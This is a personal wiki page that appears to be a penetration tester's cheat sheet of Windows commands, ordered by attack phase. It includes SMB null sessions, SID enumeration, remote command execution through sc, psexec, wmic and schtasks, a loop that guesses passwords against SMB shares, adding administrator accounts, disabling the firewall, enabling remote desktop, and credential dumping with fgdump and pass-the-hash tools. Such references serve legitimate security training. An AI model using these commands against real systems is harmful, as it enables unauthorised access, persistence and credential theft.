---
title: 'Wiki: Windows Commands'
author: ron
layout: wiki
permalink: "/wiki/Windows_Commands"
date: '2024-08-04T15:51:38-04:00'
redirect_from:
- "/wiki/index.php/Windows_Commands"
---

## Recon

### nslookup

-   Types of record: NS, A, HINFO, MX, TXT, CNAME, SOA, RP, PTR, SRV

    nslookup &lt;site&gt;

-   Interactive mode:

    nslookup
    &gt; [name or ip]
    &gt; server [server ip]
    &gt; set type=any
    &gt; ls -d [target_domain] [&gt; filename]
    &gt; view [filename]

-   No recurse:

    &gt; set norecurse
    &gt; set recurse

## Scanning

### tracert

Parameters

-   -d \-- don\'t resolve names
-   -h \<N\> \-- max number of hops (default 30)
-   -j \<hostlist\> \-- use loose source routing
-   -w \<N\> \-- wait for Nms before timing out (default 4000)

### SMB session {#smb_session}

Establishing a null session

    net use \\&lt;target&gt; "" /u:""

Establishing an authenticated session

    net use \\&lt;target&gt; &lt;password&gt; /u:&lt;username&gt;

Mount a share

    net use * \\&lt;target&gt;\&lt;share&gt; &lt;password&gt; /u:&lt;username&gt;
    net use * \\&lt;target&gt;\&lt;share&gt; &lt;password&gt; /u:&lt;machinename&gt;\&lt;username&gt;
    net use * \\&lt;target&gt;\c$ &lt;password&gt; /u:&lt;username&gt;

Dropping SMB sessions

    net use \\&lt;target&gt; /del

Dropping all SMB sessions (bad idea)

    net use * /del

### Pulling credentials (w/ SMB session) {#pulling_credentials_w_smb_session}

Pulling credentials

    enum -U &lt;target&gt;
    enum -G &lt;target&gt;

user2sid

-   Outputs in the form S-X-Y-target_sid-RID

    user2sid \\&lt;target&gt; &lt;machine_name&gt;

sid2user

-   Requires spaces instead of dashes

    sid2user \\&lt;target&gt; 5 &lt;target_sid&gt; &lt;N&gt;

    for /L %i in (1000, 1, 1050) do @sid2user \\&lt;target&gt; 5 &lt;target_sid&gt; %i

## Exploitation

### Finding client-side programs {#finding_client_side_programs}

    dir /s "c:\Program Files"

    dir /s /b "c:\Program Files\*.exe"

### Service interaction {#service_interaction}

List running services

    sc query

List all services

    sc query state= all

List all service names

    sc query state= all | find "SERVICE_NAME"

Query service information

    sc query &lt;servicename&gt;
    sc qc &lt;servicename&gt;

Start a service

    sc config &lt;servicename&gt; start= demand
    sc start &lt;servicename&gt;

Starting telnet

    sc query tlntsvr
    sc config tlntsvr start= demand
    sc start tlntsvr

Starting terminal services

    sc query termservice
    sc config termservice start= demand
    sc start termservice

Using sc to invoke an executable

    net use \\&lt;target&gt; &lt;password&gt; /u:&lt;username&gt;
    sc \\&lt;target&gt; create &lt;name&gt; binpath= &lt;command&gt;
    sc \\&lt;target&gt; start &lt;name&gt;

Making that service invoke another executable

    sc \\&lt;target&gt; &lt;name&gt; create binpath= "cmd.exe /k &lt;command&gt;"

### Variables

Finding environmental variables

    set

Finding a specific variable

    set &lt;variable&gt;
    echo %&lt;variable&gt;%
    set username
    set path
    set systemroot
    echo %systemroot%
    cd %systemroot%
    etc.

### Users and groups {#users_and_groups}

Listing users

    net user

Creating a user

    net user &lt;username&gt; &lt;password&gt; /add

Listing groups

    net localgroup

Creating a group

    net localgroup &lt;groupname&gt; /add

Adding a user to a group

    net localgroup &lt;groupname&gt; &lt;username&gt; /add

Adding a user to the telnet users group

    net user &lt;username&gt; &lt;password&gt; /add
    net localgroup TelnetClients /add
    net localgroup TelnetClients &lt;username&gt; /add

Adding a user to the terminal services group

    net localgroup "Remote Desktop Users" &lt;username&gt; /add

List administrators

    net localgroup administrators

Add an administrator

    net user &lt;username&gt; %lt;password&gt; /add
    net localgroup administrators &lt;username&gt; /add

Remove a user from a group

    net localgroup &lt;group&gt; &lt;username&gt; /del

Delete a user

    net user &lt;username&gt; /del

### Firewall interaction {#firewall_interaction}

Help

    netsh /?

Show config

    netsh firewall show config

Open a specific port

    netsh firewall add portopening protocol = &lt;TCP|UDP&gt; port = &lt;port&gt; name = &lt;comment&gt; scope = custom addresses = &lt;address/CIDR&gt;

Remove the port opening

    netsh firewall del portopening protocol = &lt;TCP|UDP&gt; port = &lt;port&gt;

Disable the firewall completely (bad idea)

    netsh firewall set opmode disable

Opening the firewall for telnet

    netsh firewall add portopening protocol = TCP port = 23 name = telnet mode = enable scope = custom addresses = &lt;address&gt;

Opening the firewall for terminal services

    netsh firewall set service type = remotedesktop mode = enable scope = custom addresses = &lt;address&gt;

Opening the firewall for SSH

    netsh firewall add portopening protocol = TCP port = 22 name = sshd mode = enable scope = custom addresses = &lt;address&gt;

### Registry interaction {#registry_interaction}

Query a key

    reg query &lt;keyname&gt;

Adding a key

    reg add &lt;keyname&gt; /v &lt;valuename&gt; /t &lt;type&gt; /d &lt;data&gt;

Export data

    reg export &lt;keyname&gt; &lt;filename.reg&gt;

Import data

    reg import &lt;filename.reg&gt;

Enabling terminal services

    reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0

### netstat

Finding a port

    netstat -an | find "&lt;port&gt;"

### ipconfig

Dump the DNS cache

    ipconfig /displaydns

### arp

Dump the ARP cache

    arp -a

### Looping

/L loop

    for /L %i in (&lt;start&gt;,&lt;step&gt;,&lt;stop&gt;) do &lt;command&gt;

Counting

    for /L %i in (1,1,255) do @echo %i

Ping scanning

    for /L %i in (1,1,255) do @echo 10.10.10.%i & @ping -n 5 10.10.10.%i | find "Reply"

DNS bruteforce

    for /L %i in (1,1,255) do @nslookup 10.10.10.%i 2>nul | find "Name" && echo 10.10.10.%i

/F loop

    for /F ["&lt;options&gt;"] %i in (&lt;stuff&gt;) do &lt;command&gt;

Looping through passwords

    for /F %i in (password.lst) do @echo %i & @net use \\&lt;target&gt; %i /u:&lt;username&gt; 2>nul && pause

Portscanning from a file

    for /F %i in (ports.txt) do @nc -n -vv -w3 10.10.10.50 %i

### psexec

Using psexec (sysinternals)

-   -s to run as system
-   -c to copy the program to the target first
-   -d to run in \"detached\" mode (no console)

    psexec \\&lt;target&gt; -d -u &lt;user&gt; -p &lt;password&gt; &lt;command&gt;

### at/schtasks

Starting the scheduler service

    net use \\&lt;target&gt; &lt;password&gt; &lt;username&gt;
    sc [\\&lt;target&gt;] query schedule
    sc [\\&lt;target&gt;] start schedule

Scheduling with at:

    at [\\&lt;target&gt;] &lt;HH:MM&gt;&lt;A|P&gt; &lt;command&gt;

Scheduling with schtasks

    schtasks /create /tn &lt;taskname&gt; /s &lt;target&gt; /u &lt;user&gt; /p &lt;password&gt; /sc &lt;frequency&gt; /st &lt;starttime&gt; /sd &lt;startdate&gt; /tr &lt;command&gt;

### wmic

Running a program

    wmic /node:&lt;target&gt; /user:&lt;username&gt; /password:&lt;password&gt; process call create &lt;command&gt;

List processes

    wmic /node:&lt;target&gt; /user:&lt;username&gt; /password:&lt;password&gt; process list brief

    wmic /node:&lt;target&gt; /user:&lt;username&gt; /password:&lt;password&gt; process where processid="&lt;pid&gt;" delete

    wmic /node:&lt;target&gt; /user:&lt;username&gt; /password:&lt;password&gt; process where name="&lt;name&gt;" delete

## Passwords

### Account lockout {#account_lockout}

Info on Windows accounts

    net accounts
    net accounts /domain

### fgdump

Options

-   -c \-- don\'t get cached credentials
-   -h \<target\>
-   -u \<username\>

    fgdump -c -h &lt;target&gt; -u &lt;username&gt;

### Pass-the-hash toolkit (psh-toolkit) {#pass_the_hash_toolkit_psh_toolkit}

Trend finally noticed/deleted these programs, so I don\'t have their parameters handy

-   whosthere-exe
-   genhash.exe
-   iam.exe

## Helpful hints {#helpful_hints}

### ftp

Download a file as anonymous

    ftp -A -s:ftp-script.txt &lt;host&gt;

The script

    get &lt;file&gt;
    bye

An even better script, that grabs everything in the base directory

    prompt
    mget .
    bye
